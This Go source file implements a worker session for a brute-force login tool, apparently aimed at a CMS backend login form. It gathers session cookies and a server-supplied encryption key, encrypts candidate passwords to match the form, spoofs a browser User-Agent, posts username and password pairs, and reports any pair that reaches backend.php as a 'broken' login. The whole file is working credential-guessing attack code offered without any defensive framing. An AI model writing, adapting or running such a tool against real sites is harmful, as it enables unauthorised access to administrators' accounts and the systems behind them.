package bruto

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
)

var errSessionOver = errors.New("Session has terminated")
var errSessionReady = errors.New("Session has started")

const userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"

type sessionError struct {
	s   *session
	err error
}

func newSessionError(s *session, err error) *sessionError {
	return &sessionError{s: s, err: err}
}

func (s *sessionError) fatal() bool {
	return s.err != errSessionReady
}

func (s *sessionError) finished() bool {
	return s.err == errSessionOver
}

func (s *sessionError) Error() string {
	return s.err.Error()
}

type session struct {
	// URLs configuration
	urls urls
	// Session connection
	client   *http.Client
	postVals url.Values
	// encrypted is initialized to encrypt passwords after the
	// session is ready.
	enc *encrypter
	// ready is closed when the session is ready, otherwise
	// an error is sent then the channel is closed.
	sessions chan<- error
	// password channel generates passwords to try
	logins <-chan login
	// broken is the channel where sucessful logins are sent
	broken chan<- login
}

func newSession(urls urls, sessions chan<- error, logins <-chan login, broken chan<- login) *session {
	s := &session{
		enc:      &encrypter{},
		urls:     urls,
		sessions: sessions,
		logins:   logins,
		broken:   broken,
		postVals: url.Values{},
	}
	// Preset constant POST values
	s.postVals.Set("login_status", "login")
	s.postVals.Set("redirect_url", "backend.php")
	s.postVals.Set("loginRefresh", "")
	s.postVals.Set("p_field", "")
	s.postVals.Set("openid_url", "")
	s.postVals.Set("commandLI", "Submit")
	return s
}

func (s *session) ready() {
	s.sessions <- newSessionError(s, errSessionReady)
}

func (s *session) fail(err error) error {
	s.sessions <- newSessionError(s, err)
	return err
}

func (s *session) prepareReq(req *http.Request) *http.Request {
	// Server crashes if the User-Agent is not "known"
	req.Header.Set("User-Agent", userAgent)
	return req
}

func (s *session) httpPost(url string, vals *url.Values) (*http.Response, error) {
	req, err := http.NewRequest("POST", url, strings.NewReader(vals.Encode()))
	if err != nil {
		return nil, err
	}
	return s.client.Do(s.prepareReq(req))
}

func (s *session) httpGet(url string) (*http.Response, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	return s.client.Do(s.prepareReq(req))
}

func (s *session) init() error {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return err
	}
	s.client = &http.Client{
		Jar: jar,
		// Timeout: ... TODO: set this to something > 5s
	}
	resp, err := s.httpGet(s.urls.init())
	if err != nil {
		return err
	}
	// Don't care about body, just get the cookies
	io.Copy(ioutil.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return errors.New(fmt.Sprintf("Invalid status code for login form call: %s", resp.Status))
	}
	resp, err = s.httpGet(s.urls.ajax())
	if err != nil {
		return err
	}
	// Don't care about body, just get the header
	io.Copy(ioutil.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return errors.New(fmt.Sprintf("Invalid status code for AJAX call: %s", resp.Status))
	}
	xjson := resp.Header.Get("X-JSON")
	if xjson == "" {
		return errors.New("Response to AJAX call contained no JSON")
	}
	// Stupid and inefficient unmarshalling of JSON, for now
	if err := json.Unmarshal([]byte(xjson), &s.enc); err != nil {
		return err
	}
	return s.enc.seed()
}

func (s *session) try(l login) error {
	// Encrypt password
	data, err := s.enc.encrypt(l.pass)
	if err != nil {
		return err
	}
	// Set request specific POST values
	s.postVals.Set("userident", data)
	s.postVals.Set("username", l.user)
	// Post login form
	resp, err := s.httpPost(s.urls.login(), &s.postVals)
	if err != nil {
		return err
	}
	fmt.Printf("%s\n", resp.Request.URL.Path)
	// If the current location is "backend.php", we are in
	if strings.Index(resp.Request.URL.Path, "backend.php") >= 0 {
		// This login worked, send back on the broken logins channel
		s.broken <- l
	}
	return nil
}

func (s *session) run() error {
	if err := s.init(); err != nil {
		return s.fail(err)
	}
	// Signal that this session is ready to do real work
	s.ready()
	// Fetch login pairs and try them
	for l := range s.logins {
		if err := s.try(l); err != nil {
			return s.fail(err)
		}
	}
	// Signal that this session has terminated
	return s.fail(errSessionOver)
}
